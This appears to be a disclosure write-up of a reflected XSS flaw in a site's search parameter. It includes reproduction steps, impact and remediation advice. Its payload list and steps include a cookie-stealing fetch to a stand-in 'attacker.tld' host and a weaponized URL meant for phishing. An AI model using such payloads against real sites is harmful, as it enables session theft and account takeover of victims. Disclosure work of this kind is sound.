## Title
Unauthenticated Reflected XSS in Search Functionality Allows Arbitrary JavaScript Execution

## OWASP - Vulnerability
OWASP Top 10 2025 - A05 Injection

## Description
An unauthenticated Reflected Cross-Site Scripting (`XSS`) vulnerability exists in the website's search functionality, allowing attackers to execute arbitrary JavaScript in a victim's browser. When a user visits a specially crafted URL containing malicious script in the search query, the server immediately reflects that input back into the HTTP response without proper sanitization or context-aware output encoding.

## Vulnerable Endpoint
`https://refseek.pwnedbox.site/index.php?q=`

## Payload Used
```
  cybrnoob'"<><script>alert(document.location)</script>
  cybrnoob'"<><script>cosole.error(document.location)</script>
  cybrnoob'"<><script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>
```
## POC / Steps to Reproduce
1. Interact with the search box and observe whether the input `cybrnoob'"<>` is reflected in the source.
    <img width="1512" height="982" alt="SCR-20261119-ohxh" src="https://github.com/user-attachments/assets/5cb85b57-2a9c-49b2-8953-a2cb58b6db0a" />
2. Inject javascript in the search box to verify if it is executed.
  - Note: `alert(), confirm(), prompt(), console.log(), console.error(), fetch()` all generate valid responses.
     - Here it can be seen that the injected payload executes seamlessly.
    <img width="1512" height="982" alt="SCR-20261119-ohxh" src="https://github.com/user-attachments/assets/23fc53a6-645d-4064-9473-610b5c27ac05" />
    <img width="1512" height="982" alt="SCR-20261119-onez" src="https://github.com/user-attachments/assets/8e35328f-e377-45e9-9e30-6ff7e2542a0f" />
3. Craft a weaponized URL (e.g., `https://refseek.pwnedbox.site/index.php?q<script>fetch('https://attacker.tld/steal?c='+document.cookie)</script>`) and deliver it to a victim via phishing, malicious link, or social engineering; upon opening the link, the payload executes in the victim's browser origin without any user interaction beyond clicking the link.

## Impact / Risk
1. An attacker can steal session cookies and impersonate the victim.
2. Malicious script can display fake login forms and steal credentials.
3. The script can redirect users, alter page content, or perform actions on their behalf.

## Recommendation
1. Never trust any user input. Treat the q parameter as untrusted regardless of its source.
2. Sanitize the search input and reject or strip HTML special characters such as <, >, ", ', and &.
3. Apply context-aware HTML encoding on output so reflected input is rendered as text and never as executable markup.
4. Use a vetted encoding library and add a restrictive Content Security Policy with HttpOnly and SameSite cookies as defense in depth.
